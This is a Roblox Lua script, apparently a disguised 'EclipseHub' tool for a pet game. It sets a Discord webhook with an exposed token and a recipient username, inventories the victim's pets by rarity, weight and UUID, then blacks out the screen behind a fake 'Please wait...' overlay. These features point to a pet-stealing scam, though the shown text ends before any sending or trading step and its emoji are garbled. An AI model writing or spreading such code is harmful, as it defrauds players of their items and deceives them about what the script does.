getgenv().Webhook = "https://discord.com/api/webhooks/1393571947840929813/Yk-SBXIZoh-FP02pfhIfxthDSYJvUiIxbqugybWYu_gMi0XaccmE3E_1vjcMwZaBpJRM"
getgenv().Username = "PUT_HERE_UR_USERNAME"

local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local DataService = require(RS.Modules.DataService)
local PetRegistry = require(RS.Data.PetRegistry)
local NumberUtil = require(RS.Modules.NumberUtil)
local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
local PetsService = require(RS.Modules.PetServices.PetsService)

local data = DataService:GetData()
local maxAttempts = 10
local attempt = 1
local teleported = false

if getgenv().EclipseHubRunning then
    warn("Script is already running or has been executed! Cannot run again.")
    return
end
getgenv().EclipseHubRunning = true

local PetPriorityData = {
    ["Kitsune"] = { priority = 1, emoji = "ü¶ä", isMutation = false },
    ["Raccoon"] = { priority = 2, emoji = "ü¶ù", isMutation = false },
    ["Disco Bee"] = { priority = 3, emoji = "ü™©", isMutation = false },
    ["Fennec fox"] = { priority = 4, emoji = "ü¶ä", isMutation = false },
    ["Butterfly"] = { priority = 5, emoji = "ü¶ã", isMutation = false },
    ["Dragonfly"] = { priority = 6, emoji = "üê≤", isMutation = false },
    ["Mimic Octopus"] = { priority = 7, emoji = "üêô", isMutation = false },
    ["Corrupted Kitsune"] = { priority = 8, emoji = "ü¶ä", isMutation = false },
    ["T-Rex"] = { priority = 9, emoji = "ü¶ñ", isMutation = false },
    ["Spinosaurus"] = { priority = 10, emoji = "ü´é", isMutation = false },
    ["Queen Bee"] = { priority = 11, emoji = "üëë", isMutation = false },
    ["Red Fox"] = { priority = 26, emoji = "ü¶ä", isMutation = false },
    ["Ascended"] = { priority = 14, emoji = "üî∫", isMutation = true },
    ["Mega"] = { priority = 15, emoji = "üêò", isMutation = true },
    ["Shocked"] = { priority = 16, emoji = "‚ö°", isMutation = true },
    ["Rainbow"] = { priority = 17, emoji = "üåà", isMutation = true },
    ["Radiant"] = { priority = 18, emoji = "üõ°Ô∏è", isMutation = true },
    ["Corrupted"] = { priority = 19, emoji = "üßø", isMutation = true },
    ["IronSkin"] = { priority = 20, emoji = "üí•", isMutation = true },
    ["Tiny"] = { priority = 21, emoji = "üîπ", isMutation = true },
    ["Golden"] = { priority = 22, emoji = "ü•á", isMutation = true },
    ["Frozen"] = { priority = 23, emoji = "‚ùÑÔ∏è", isMutation = true },
    ["Windy"] = { priority = 24, emoji = "üå™Ô∏è", isMutation = true },
    ["Inverted"] = { priority = 25, emoji = "üîÑ", isMutation = true },
    ["Shiny"] = { priority = 26, emoji = "‚ú®", isMutation = true },
    ["Tranquil"] = { priority = 27, emoji = "üßò", isMutation = true },
}

local function formatNumberWithCommas(n)
    local str = tostring(n)
    return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function getWeight(toolName)
    if not toolName or toolName == "No Tool" then return nil end
    local weight = toolName:match("%[([%d%.]+) KG%]")
    return weight and tonumber(weight)
end

local function getAge(toolName)
    if not toolName or toolName == "No Tool" then return nil end
    local age = toolName:match("%[Age (%d+)%]")
    return age and tonumber(age)
end

local function GetPlayerPets()
    local unsortedPets = {}
    local player = Players.LocalPlayer
    
    if not data or not data.PetsData then
        warn("No pet data available")
        return unsortedPets
    end

    for _, tool in pairs(player.Backpack:GetChildren()) do
        if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
            local petName = tool.Name
            if petName:find("Bald Eagle") or petName:find("Golden Lab") then continue end

            local age = getAge(tool.Name) or 0
            local weight = getWeight(tool.Name) or 0
            local strippedName = petName:gsub(" %[.*%]", "")
            
            table.insert(unsortedPets, {
                PetName = petName,
                PetAge = age,
                PetWeight = weight,
                Id = tool:GetAttribute("PET_UUID"),
                Type = strippedName,
                Value = 0,
                Formatted = "0"
            })
        end
    end
    return unsortedPets
end

local pets = GetPlayerPets()

local function CreateGui()
    local gui = Instance.new("ScreenGui")
    gui.Name = "EclipseHubGui"
    gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    bg.Parent = gui
    
    local spinner = Instance.new("ImageLabel")
    spinner.Size = UDim2.new(0.2, 0, 0.2, 0)
    spinner.Position = UDim2.new(0.4, 0, 0.3, 0)
    spinner.Image = "rbxassetid://74011233271790"
    spinner.Parent = bg
    
    local title = Instance.new("TextLabel")
    title.Text = "Please wait..."
    title.Size = UDim2.new(1, 0, 0.1, 0)
    title.Position = UDim2.new(0, 0, 0.5, 0)
    title.Parent = bg
    
    return gui
end

local gui = CreateGui()
